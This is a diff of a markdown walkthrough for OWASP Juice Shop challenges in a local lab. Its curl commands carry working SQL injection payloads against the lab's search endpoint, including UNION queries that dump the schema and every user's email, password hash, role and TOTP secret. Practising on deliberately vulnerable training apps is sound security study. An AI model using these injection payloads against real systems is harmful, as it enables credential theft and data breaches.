@@ -28,31 +28,24 @@ burpsuite
 install_firefox_foxy_proxy
 ```
 
-<!--
-
-TODO
-* box alias/hostname i.e. box-owasp-juice-shop-7159w:3000 -> juice:3000
-* kali-ui
-* parrot-web
-
--->
-
 ## Challenges
 
 * [Challenge hunting](https://help.owasp-juice.shop/part2/)
 
 ### Finding the Score Board
 
-Guess link is `http://box-owasp-juice-shop-<RANDOM>:3000/#/score-board`
+Guess link `http://box-owasp-juice-shop-<RANDOM>:3000/#/score-board`
 
 ### Injection
 
 Resources
+
 * [SQL injection](https://portswigger.net/web-security/sql-injection)
 
-With burp look for a request with parameters
+Intercept request with burp and look for a request with parameters
+
 ```bash
-# sent to intruder
+# send to intruder
 #GET /rest/products/search?q=';
 
 # show SQLi vulnerability
@@ -70,6 +63,7 @@ curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:300
 ```
 
 Order the Christmas special offer of 2014
+
 ```bash
 curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=2014%'+AND+deletedAt+IS+NOT+NULL));--" | jq
 
@@ -79,6 +73,7 @@ curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:300
 ```
 
 Exfiltrate the entire DB schema definition via SQL Injection
+
 ```bash
 # Products table has 9 columns (see json above)
 # to fix "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns"
@@ -87,11 +82,13 @@ curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:300
 ```
 
 Log in with the (non-existing) accountant without ever registering that user
+
 ```bash
 TODO
 ```
 
 Retrieve a list of all user credentials via SQL Injection
+
 ```bash
 curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=foo%'))+UNION+SELECT+id,username,email,password,role,deluxeToken,totpSecret,isActive,createdAt+FROM+Users;--" | jq '.data'
 ```
